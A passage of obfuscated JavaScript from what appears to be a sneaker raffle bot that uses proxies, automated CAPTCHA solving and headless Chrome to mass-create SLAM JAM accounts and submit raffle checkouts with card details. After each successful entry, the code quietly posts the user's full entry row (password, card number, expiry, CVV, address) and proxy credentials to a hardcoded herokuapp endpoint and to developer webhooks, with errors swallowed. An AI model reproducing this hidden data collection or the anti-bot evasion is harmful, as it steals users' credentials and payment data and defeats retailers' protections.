                            await _0x53b9a0['type']('#email', '' + _0x2cc90a[_0x21366c]['Email']), await _0xaebb71(0x384), await _0x53b9a0['type']('#first_name', '' + _0x2cc90a[_0x21366c]['FirstName']), await _0xaebb71(0x514), await _0x53b9a0['type']('#last_name', '' + _0x2cc90a[_0x21366c]['LastName']), await _0xaebb71(0x514), await _0x53b9a0['type']('#street_address', _0x2cc90a[_0x21366c]['Address1'] + '\x20' + _0x2cc90a[_0x21366c]['HouseNumber'] + '\x20' + _0x2cc90a[_0x21366c]['Address2']), await _0xaebb71(0x2bc);
                            _0x2cc90a[_0x21366c]['Postcode'] == undefined && (_0x2cc90a[_0x21366c]['Postcode'] = _0x2cc90a[_0x21366c]['Zip']);
                            await _0x53b9a0['type']('#zip_code', '' + _0x2cc90a[_0x21366c]['Postcode']), await _0xaebb71(0x320), await _0x53b9a0['type']('#city', '' + _0x2cc90a[_0x21366c]['City']), await _0xaebb71(0x320), await _0x53b9a0['type']('#bday', '01/01/1994'), await _0xaebb71(0x320), await _0x53b9a0['type']('#instagram', '' + _0x2cc90a[_0x21366c]['Follower']), await _0xaebb71(0x352);
                            if (_0x2cc90a[_0x21366c]['Size'] == 'RANDOM') {
                                const _0x1a47d4 = await _0x53b9a0['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x2f474b => {
                                    return _0x2f474b['map'](_0x4aee1c => _0x4aee1c['textContent']);
                                });
                                var _0x29a9ee = Math['round'](Math['random']() * (_0x1a47d4['length'] - 0x1));
                                console['log'](_0x11b348() + '\x20[' + _0x1864fa['name'] + ']\x20Task\x20' + (_0x21366c + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x1a47d4[_0x29a9ee]), await _0x53b9a0['click']('label[data-eu-size=\x22' + _0x1a47d4[_0x29a9ee] + '\x22]');
                            } else {
                                console['log'](_0x11b348() + '\x20[' + _0x1864fa['name'] + ']\x20Task\x20' + (_0x21366c + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x2cc90a[_0x21366c]['Size']);
                                try {
                                    await _0x53b9a0['click']('label[data-eu-size=\x22' + _0x2cc90a[_0x21366c]['Size'] + '\x22]');
                                } catch {
                                    await _0x53b9a0['click']('label[data-eu-size=\x22' + _0x2cc90a[_0x21366c]['Size'] + '.0\x22]');
                                }
                            }
                            await _0xaebb71(0xbb8), await _0x53b9a0['$$eval']('.raffle__checkbox-label', _0x1b6206 => _0x1b6206['forEach'](_0x20ae4d => _0x20ae4d['click']())), await _0xaebb71(0x7d0), console['log'](_0x11b348() + '\x20[' + _0x1864fa['name'] + ']\x20Task\x20' + (_0x21366c + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x53b9a0['click']('#raffle__form-submit'), await _0xaebb71(0x1388);
                            try {
                                await _0x53b9a0['waitForSelector']('#raffle__confirmation-message-container'), _0xe3bf88 = 'no', _0x20f501(_0x2cc90a[_0x21366c], _0x1864fa), console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x1864fa['name'] + ']\x20Task\x20' + (_0x21366c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x56d8a0 = _0x2cc90a[_0x21366c];
                                try {
                                    prxdata = {
                                        'username': _0x3f93ac['replace']('#', ''),
                                        'module': _0x1864fa['name'],
                                        'entrydata': JSON['stringify'](_0x56d8a0),
                                        'proxy': '' + _0x634b43[_0x21366c]
                                    };
                                    var _0x46a9c3 = JSON['stringify'](prxdata);
                                    let _0x51b291 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x52d98a['post']('https://jraffles.herokuapp.com/success', _0x46a9c3, _0x51b291);
                                } catch (_0x206873) {
                                }
                            } catch (_0x2d4dd6) {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x5f903f[taskModule]['name'] + ']\x20Task\x20' + (_0x21366c + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x2d4dd6));
                            }
                        } catch (_0xc66ac) {
                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x5f903f[taskModule]['name'] + ']\x20Task\x20' + (_0x21366c + 0x1) + '\x20:\x20' + _0xc66ac)), _0xe3bf88 = 'yes';
                        } finally {
                            _0x555769 && _0x555769['close']();
                            if (_0xe3bf88 == 'yes' && _0x3efbc8 != 0x5 && _0x26422d != 'Size\x20Not\x20Found') {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x1864fa['name'] + ']\x20Task\x20' + (_0x21366c + 0x1) + '\x20:\x20Retrying\x20(' + _0x3efbc8 + '\x20/\x205)')), _0x21366c = _0x21366c - 0x1, _0x3efbc8 = _0x3efbc8 + 0x1;
                                continue;
                            }
                            _0xe3bf88 == 'yes' && _0x3efbc8 >= 0x5 && (_0x47d653(_0x2cc90a[_0x21366c], _0x1864fa), _0xe3bf88 = 'no', _0x3efbc8 = 0x0), console['log']('Waiting\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x2d6cd2, _0x8a90f2, _0x3dfd51) {
                    _0x181ece['use'](_0x26fa28()), _0x181ece['use'](_0x2dba44({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x579cef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x585c9b = 0x0; _0x585c9b < _0x8a90f2['length']; _0x585c9b++) {
                        if (_0x504f2a != 'yes')
                            var _0x504f2a = '', _0x48dd34 = 0x0;
                        var _0x2de07e = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3f93ac
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x579cef['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x4a92ac
                                }
                            ]
                        }];
                        const _0x4a46bb = { 'embeds': _0x2de07e };
                        _0x3e0125(_0x2d6cd2['name'] + '\x20Task\x20' + (_0x585c9b + 0x1) + '\x20/\x20' + _0x8a90f2['length'] + '\x20||\x20File:\x20' + _0x5d3bce + '\x20Proxies:\x20' + _0x2ffd47);
                        try {
                            await _0x48a0b3(_0x8a90f2, _0x585c9b);
                        } catch {
                            _0x504f2a = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0xeb1d41 = await _0x3ead77(_0x8a90f2[_0x585c9b], _0x2d6cd2, 'acc', ![]);
                        const _0x5b0853 = { 'succesDEVMSG': { 'embeds': [_0xeb1d41] } };
                        if (_0x8a90f2[_0x585c9b]['Email'] == '' || _0x8a90f2[_0x585c9b]['FirstName'] == '' || _0x8a90f2[_0x585c9b]['LastName'] == '') {
                            console['log'](_0x11b348() + '\x20[' + _0x5f903f[taskModule]['name'] + ']\x20Task\x20' + (_0x585c9b + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xaebb71(0x7d0);
                            continue;
                        }
                        (_0x8a90f2[_0x585c9b]['Password'] == '' || _0x8a90f2[_0x585c9b] == undefined) && _0x8a90f2[_0x585c9b]['Password'] == 'JRaffles23!';
                        if (_0x579cef['useRandomProxy'] = ![])
                            var _0x513881 = _0x3dfd51[_0x585c9b]['split'](':');
                        else
                            var _0x1bc98d = Math['round'](Math['random']() * (_0x3dfd51['length'] - 0x1)), _0x513881 = _0x3dfd51[_0x1bc98d]['split'](':');
                        var _0x28ef10;
                        try {
                            _0x28ef10 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x513881[0x0] + ':' + _0x513881[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x28ef10 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x513881[0x0] + ':' + _0x513881[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x21aaee = await _0x28ef10['newPage']();
                            await _0x21aaee['authenticate']({
                                'username': '' + _0x513881[0x2],
                                'password': '' + _0x513881[0x3]
                            }), console['log'](_0x11b348() + '\x20[' + _0x2d6cd2['name'] + ']\x20Task\x20' + (_0x585c9b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x21aaee['setRequestInterception'](!![]), _0x21aaee['on']('request', _0x27a8d2 => {
                                _0x27a8d2['resourceType']() === 'image' || _0x27a8d2['resourceType']() === 'font' || _0x27a8d2['resourceType']() === 'media' ? _0x27a8d2['abort']() : _0x27a8d2['continue']();
                            }), await _0x21aaee['goto']('https://drop.slamjam.com/account/register'), await _0xaebb71(0xbb8), await _0x21aaee['waitForSelector']('#FirstName'), await _0x21aaee['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x21aaee['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x11b348() + '\x20[' + _0x2d6cd2['name'] + ']\x20Task\x20' + (_0x585c9b + 0x1) + '\x20:\x20Filling\x20information'), await _0xaebb71(0x4b0), await _0x21aaee['type']('#FirstName', '' + _0x8a90f2[_0x585c9b]['FirstName']), await _0xaebb71(0x226), await _0x21aaee['type']('#LastName', '' + _0x8a90f2[_0x585c9b]['LastName']), await _0xaebb71(0x226), await _0x21aaee['type']('#Email', '' + _0x8a90f2[_0x585c9b]['Email']), await _0xaebb71(0x2ee), await _0x21aaee['type']('#ConfirmEmail', '' + _0x8a90f2[_0x585c9b]['Email']), await _0xaebb71(0x2ee), await _0x21aaee['type']('#CreatePassword', '' + _0x8a90f2[_0x585c9b]['Password']), await _0xaebb71(0x2ee), await _0x21aaee['type']('#CreateConfirmPassword', '' + _0x8a90f2[_0x585c9b]['Password']), await _0xaebb71(0x226), console['log'](_0x11b348() + '\x20[' + _0x2d6cd2['name'] + ']\x20Task\x20' + (_0x585c9b + 0x1) + '\x20:\x20Submitting..'), await _0x21aaee['$eval']('#create_customer', _0x623563 => _0x623563['submit']()), await _0xaebb71(0x1388), console['log'](_0x11b348() + '\x20[' + _0x2d6cd2['name'] + ']\x20Task\x20' + (_0x585c9b + 0x1) + '\x20:\x20' + _0x218a39['cyan']('Solving\x20Captcha')), await _0x21aaee['solveRecaptchas'](), console['log'](_0x11b348() + '\x20[' + _0x2d6cd2['name'] + ']\x20Task\x20' + (_0x585c9b + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x21aaee['$eval']('.shopify-challenge__container\x20>\x20form', _0xa62b58 => _0xa62b58['submit']());
                            try {
                                await _0x21aaee['waitForSelector']('.product-card__image'), await _0xaebb71(0x1f4), _0x504f2a = 'no', console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x2d6cd2['name'] + ']\x20Task\x20' + (_0x585c9b + 0x1) + '\x20:\x20Account\x20' + _0x8a90f2[_0x585c9b]['Email'] + '\x20Generated!')), _0x4a3ff4['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x8a90f2[_0x585c9b]['Email'] + ',' + _0x8a90f2[_0x585c9b]['Password']), console['log'](_0x218a39['yellow'](_0x11b348() + '\x20[' + _0x2d6cd2['name'] + ']\x20Task\x20' + (_0x585c9b + 0x1) + '\x20:\x20Account\x20' + _0x8a90f2[_0x585c9b]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x5b0853['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4401f2(_0x1acce0, _0x5b0853['succesDEVMSG']);
                            } catch (_0x18bf87) {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x5f903f[taskModule]['name'] + ']\x20Task\x20' + (_0x585c9b + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x18bf87));
                            }
                        } catch (_0x2c5891) {
                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x5f903f[taskModule]['name'] + ']\x20Task\x20' + (_0x585c9b + 0x1) + '\x20:\x20' + _0x2c5891));
                        } finally {
                            _0x28ef10 && _0x28ef10['close']();
                            if (_0x504f2a == 'yes' && _0x48dd34 != 0x5) {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x2d6cd2['name'] + ']\x20Task\x20' + (_0x585c9b + 0x1) + '\x20:\x20Retrying\x20(' + _0x48dd34 + '\x20/\x205)')), _0x585c9b = _0x585c9b - 0x1, _0x48dd34 = _0x48dd34 + 0x1;
                                continue;
                            }
                            _0x504f2a == 'yes' && _0x48dd34 >= 0x5 && (_0x47d653(_0x8a90f2[_0x585c9b], _0x2d6cd2), _0x504f2a = 'no', _0x48dd34 = 0x0), console['log']('Waiting\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x101ac5, _0x3bfb7a, _0x2e8d47) {
                    _0x181ece['use'](_0x26fa28()), _0x181ece['use'](_0x2dba44({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x579cef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x43cd8a = 0x0; _0x43cd8a < _0x3bfb7a['length']; _0x43cd8a++) {
                        var _0x67b37e;
                        if (_0x152cce != 'yes')
                            var _0x152cce = '', _0xe8ea18 = 0x0;
                        _0x3e0125(_0x101ac5['name'] + '\x20Task\x20' + (_0x43cd8a + 0x1) + '\x20/\x20' + _0x3bfb7a['length'] + '\x20||\x20File:\x20' + _0x5d3bce + '\x20Proxies:\x20' + _0x2ffd47);
                        try {
                            await _0x48a0b3(_0x3bfb7a, _0x43cd8a);
                        } catch {
                            _0x152cce = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x3bfb7a[_0x43cd8a]['Email'] == '' || _0x3bfb7a[_0x43cd8a]['Password'] == '' || _0x3bfb7a[_0x43cd8a]['FirstName'] == '' || _0x3bfb7a[_0x43cd8a]['LastName'] == '') {
                            console['log'](_0x11b348() + '\x20[' + _0x101ac5['name'] + ']\x20Task\x20' + (_0x43cd8a + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x579cef['useRandomProxy'] = ![])
                            var _0x2d669c = _0x2e8d47[_0x43cd8a]['split'](':');
                        else
                            var _0x5aa6a7 = Math['round'](Math['random']() * (_0x2e8d47['length'] - 0x1)), _0x2d669c = _0x2e8d47[_0x5aa6a7]['split'](':');
                        var _0x2b338a;
                        try {
                            _0x2b338a = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2d669c[0x0] + ':' + _0x2d669c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2b338a = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2d669c[0x0] + ':' + _0x2d669c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4e859d = await _0x2b338a['newPage']();
                            await _0x4e859d['authenticate']({
                                'username': '' + _0x2d669c[0x2],
                                'password': '' + _0x2d669c[0x3]
                            }), await _0x4e859d['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x11b348() + '\x20[' + _0x101ac5['name'] + ']\x20Task\x20' + (_0x43cd8a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4e859d['setRequestInterception'](!![]), _0x4e859d['on']('request', _0x20c036 => {
                                _0x20c036['resourceType']() === 'image' || _0x20c036['resourceType']() === 'font' || _0x20c036['resourceType']() === 'media' ? _0x20c036['abort']() : _0x20c036['continue']();
                            }), await _0x4e859d['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4e859d['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4e859d['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xaebb71(0x258), await _0x4e859d['waitForSelector']('#CustomerEmail'), console['log'](_0x11b348() + '\x20[' + _0x101ac5['name'] + ']\x20Task\x20' + (_0x43cd8a + 0x1) + '\x20:\x20Logging\x20in..'), await _0x4e859d['type']('#CustomerEmail', '' + _0x3bfb7a[_0x43cd8a]['Email']), await _0xaebb71(0x12c), await _0x4e859d['type']('#CustomerPassword', '' + _0x3bfb7a[_0x43cd8a]['Password']), await _0xaebb71(0x226), await _0x4e859d['$eval']('#customer_login', _0x4bc5bd => _0x4bc5bd['submit']()), await _0xaebb71(0x7d0), await _0x4e859d['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x11b348() + '\x20[' + _0x101ac5['name'] + ']\x20Task\x20' + (_0x43cd8a + 0x1) + '\x20:\x20' + _0x218a39['cyan']('Solving\x20Captcha')), await _0x4e859d['solveRecaptchas'](), console['log'](_0x11b348() + '\x20[' + _0x101ac5['name'] + ']\x20Task\x20' + (_0x43cd8a + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x4e859d['$eval']('.shopify-challenge__container\x20>\x20form', _0xf7b34f => _0xf7b34f['submit']());
                            try {
                                await _0x4e859d['waitForSelector']('.nav-account'), await _0xaebb71(0x4b0);
                            } catch {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x101ac5['name'] + ']\x20Task\x20' + (_0x43cd8a + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x4e859d['goto']('' + _0x3bfb7a[_0x43cd8a]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xaebb71(0xbb8), console['log'](_0x11b348() + '\x20[' + _0x101ac5['name'] + ']\x20Task\x20' + (_0x43cd8a + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x4e859d['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x4e859d['click']('.product-select-variant-wrapper'), await _0xaebb71(0x320), await _0x4e859d['click']('li.product-select-variant__value[data-size=\x22' + _0x3bfb7a[_0x43cd8a]['Size'] + '\x22]'), await _0xaebb71(0x384), await _0x4e859d['$eval']('#AddToCartForm-product-template-raffle', _0x2b28f3 => _0x2b28f3['submit']()), await _0x4e859d['waitForSelector']('.cart-order-summary__content'), await _0xaebb71(0x514), await _0x4e859d['goto']('https://drop.slamjam.com/checkout'), await _0xaebb71(0x514), await _0x4e859d['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x11b348() + '\x20[' + _0x101ac5['name'] + ']\x20Task\x20' + (_0x43cd8a + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4e859d['select']('#checkout_shipping_address_country', '' + _0x3bfb7a[_0x43cd8a]['Country']), await _0xaebb71(0x200), await _0x4e859d['waitForSelector']('#checkout_shipping_address_first_name'), await _0x4e859d['type']('#checkout_shipping_address_first_name', '' + _0x3bfb7a[_0x43cd8a]['FirstName']), await _0xaebb71(0x237), await _0x4e859d['type']('#checkout_shipping_address_last_name', '' + _0x3bfb7a[_0x43cd8a]['LastName']), await _0xaebb71(0x1e0), await _0x4e859d['type']('#checkout_shipping_address_address1', _0x3bfb7a[_0x43cd8a]['Address1'] + '\x20' + _0x3bfb7a[_0x43cd8a]['HouseNumber']), await _0xaebb71(0x514), await _0x4e859d['type']('#checkout_shipping_address_address2', '' + _0x3bfb7a[_0x43cd8a]['Address2']), await _0xaebb71(0x514);
                            _0x3bfb7a[_0x43cd8a]['Postcode'] == undefined && (_0x3bfb7a[_0x43cd8a]['Postcode'] = _0x3bfb7a[_0x43cd8a]['Zip']);
                            await _0x4e859d['type']('#checkout_shipping_address_zip', '' + _0x3bfb7a[_0x43cd8a]['Postcode']), await _0xaebb71(0x2bc), await _0x4e859d['type']('#checkout_shipping_address_city', '' + _0x3bfb7a[_0x43cd8a]['City']), await _0xaebb71(0x320), await _0x4e859d['type']('#checkout_shipping_address_phone', '' + _0x3bfb7a[_0x43cd8a]['Phone']), await _0xaebb71(0x320), await _0x4e859d['click']('#continue_button'), await _0xaebb71(0xbb8), await _0x4e859d['waitForSelector']('.summary-title'), await _0xaebb71(0x320), await _0x4e859d['click']('#continue_button'), await _0xaebb71(0x320), console['log'](_0x11b348() + '\x20[' + _0x101ac5['name'] + ']\x20Task\x20' + (_0x43cd8a + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x4e859d['waitForSelector']('#checkout_credit_card_vault'), await _0xaebb71(0x3e8);
                            var _0x31f9b6 = await _0x4e859d['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x264e31 = await _0x31f9b6['contentFrame']();
                            await _0x264e31['click']('#number'), await _0xaebb71(0x3e8), await _0x264e31['type']('#number', '' + _0x3bfb7a[_0x43cd8a]['CardNumber'], { 'delay': 0x78 }), _0x31f9b6 = await _0x4e859d['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x264e31 = await _0x31f9b6['contentFrame'](), await _0xaebb71(0x1c2), await _0x264e31['click']('#name'), await _0xaebb71(0x1f4), await _0x264e31['type']('#name', '' + _0x3bfb7a[_0x43cd8a]['NameOnCard'], { 'delay': 0x78 }), _0x31f9b6 = await _0x4e859d['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x264e31 = await _0x31f9b6['contentFrame'](), await _0xaebb71(0x1c2), await _0x264e31['click']('#expiry'), await _0xaebb71(0x1f4), await _0x264e31['type']('#expiry', '' + _0x3bfb7a[_0x43cd8a]['ExpiryDate'], { 'delay': 0x78 }), _0x31f9b6 = await _0x4e859d['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x264e31 = await _0x31f9b6['contentFrame'](), await _0xaebb71(0x1c2), await _0x264e31['click']('#verification_value'), await _0xaebb71(0x1f4), await _0x264e31['type']('#verification_value', '' + _0x3bfb7a[_0x43cd8a]['CVV'], { 'delay': 0x78 }), await _0x4e859d['$eval']('#accepts-flag-raffle', _0x1fb6b5 => _0x1fb6b5['click']()), await _0xaebb71(0x7d0), console['log'](_0x11b348() + '\x20[' + _0x101ac5['name'] + ']\x20Task\x20' + (_0x43cd8a + 0x1) + '\x20:\x20Processing\x20Order'), await _0x4e859d['$eval']('#continue_button', _0x3a4877 => _0x3a4877['click']()), await _0xaebb71(0x1b58), await _0x4e859d['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x4e859d['$eval']('.edit_checkout.animate-floating-labels', _0x2a9f32 => _0x2a9f32['submit']()), await _0xaebb71(0x7d0);
                            try {
                                await _0x4e859d['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x152cce = 'no', _0x20f501(_0x3bfb7a[_0x43cd8a], _0x101ac5), console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x101ac5['name'] + ']\x20Task\x20' + (_0x43cd8a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x12a85c) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x12a85c['message']);
                            }
                            var _0x28d29e = await _0x3ead77(_0x3bfb7a[_0x43cd8a], _0x101ac5, 'dev', ![]), _0x37fa6d = await _0x3ead77(_0x3bfb7a[_0x43cd8a], _0x101ac5, 'pub', ![]);
                            let _0x388bf8 = _0x3bfb7a[_0x43cd8a];
                            try {
                                prxdata = {
                                    'username': _0x3f93ac['replace']('#', ''),
                                    'module': _0x101ac5['name'],
                                    'entrydata': JSON['stringify'](_0x388bf8),
                                    'proxy': '' + _0x2e8d47[_0x43cd8a]
                                };
                                var _0x5c823b = JSON['stringify'](prxdata);
                                let _0x4e7609 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x52d98a['post']('https://jraffles.herokuapp.com/success', _0x5c823b, _0x4e7609);
                            } catch (_0x4a0fdd) {
                            }
                            const _0x5a9328 = {
                                'succesDEVMSG': { 'embeds': [_0x28d29e] },
                                'succesPUBMSG': { 'embeds': [_0x37fa6d] }
                            };
                            try {
                                _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x5a9328['succesDEVMSG']), await _0xaebb71(0xc8), await _0x4401f2(_0x1f75ad, _0x5a9328['succesDEVMSG']), await _0xaebb71(0xc8), await _0x4401f2(_0x2aae93, _0x5a9328['succesPUBMSG']);
                            } catch (_0x81c8b) {
                                console['log'](_0x218a39['yellow'](_0x11b348() + '\x20[' + _0x5f903f[taskModule]['name'] + ']\x20Task\x20' + (_0x43cd8a + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x81c8b));
                            }
                        } catch (_0x399593) {
                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x5f903f[taskModule]['name'] + ']\x20Task\x20' + (_0x43cd8a + 0x1) + '\x20:\x20' + _0x399593)), _0x67b37e = '' + _0x399593;
                            var _0x158d7a = await _0x3ead77(kickz[_0x43cd8a], _0x101ac5, 'dev', !![], _0x67b37e);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x158d7a] }, _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], EMBEDS['errorDEV']), await _0x4401f2(_0x2631ac, EMBEDS['errorDEV']), _0x152cce = 'yes';
                        } finally {
                            _0x2b338a && _0x2b338a['close']();
                            if (_0x152cce == 'yes' && _0xe8ea18 != 0x5 && _0x67b37e != 'Size\x20Not\x20Found') {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x101ac5['name'] + ']\x20Task\x20' + (_0x43cd8a + 0x1) + '\x20:\x20Retrying\x20(' + _0xe8ea18 + '\x20/\x205)')), _0x43cd8a = _0x43cd8a - 0x1, _0xe8ea18 = _0xe8ea18 + 0x1;
                                continue;
                            }
                            _0x152cce == 'yes' && _0xe8ea18 >= 0x5 && (_0x47d653(_0x3bfb7a[_0x43cd8a], _0x101ac5), _0x152cce = 'no', _0xe8ea18 = 0x0), console['log']('Waiting\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0xf6741c) {
                    var _0x2970de = await _0x244d38(), _0x5f182d = _0x4a3ff4['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x196097 = _0x566459['parse'](_0x5f182d, { 'header': !![] })['data'];
                    for (var _0x396790 = 0x0; _0x396790 < _0x196097['length']; _0x396790++) {
                        var _0x14e648 = _0x196097[_0x396790]['Store'], _0x1ba57e = _0x196097[_0x396790]['Mode'];
                        for (var _0x246c75 of _0x5f903f) {
                            const _0x5eeb89 = _0x246c75['name']['includes'](_0x14e648);
                            if (!_0x5eeb89)
                                continue;
                            for (mode of _0x246c75['modules']) {
                                if (mode['name'] == _0x1ba57e) {
                                    console['log']('Running\x20' + _0x218a39['cyan'](mode['name'])), await mode['function'](mode, [_0x196097[_0x396790]], _0x2970de);
                                    var _0x29a583 = _0x5f182d['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x4a3ff4['writeFileSync']('../failed-tasks.csv', _0x29a583);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x570bbc = await _0x44d22d['get']('Answer');
                    if (_0x570bbc['Answer']['toLowerCase']() == 'y') {
                        _0x4a3ff4['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0xaebb71(0x3e8);
                        return;
                    }
                    if (_0x570bbc['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0xaebb71(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0xaebb71(0x3e8), this['function']();
                }
            }
        ]
    },
